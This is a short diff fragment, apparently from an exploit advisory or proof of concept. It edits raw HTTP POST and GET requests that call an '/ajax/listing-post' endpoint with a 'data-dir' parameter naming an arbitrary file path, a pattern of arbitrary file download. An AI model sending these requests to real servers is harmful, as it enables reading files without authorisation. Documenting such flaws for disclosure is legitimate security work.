@@ -81,11 +81,11 @@ Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
 Cookie: SESSID=a784e25bbdb1b4c8c680adfe5b374c761ab54bfe4b933512745d00dc3263a7c0
 Connection: close
 
-explorer=true&file-download=true&folder-id=11&data-dir=PATH\TO\FILE.txt
+explorer=true&file-download=true&folder-id=11&data-dir=PATH\TO\FILE.extension
 
 GET :
 
-GET /ajax/listing-post?file-download=true&folder-id=11&data-dir=PATH\TO\FILE.txt HTTP/1.1
+GET /ajax/listing-post?file-download=true&folder-id=11&data-dir=PATH\TO\FILE.extension HTTP/1.1
 Host: 141.94.222.142:57411
 Referer: http://141.94.222.142:57411/post/O7PO1YC3aWIFBijpFqM8pvAzEBgY0IKDuSp
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
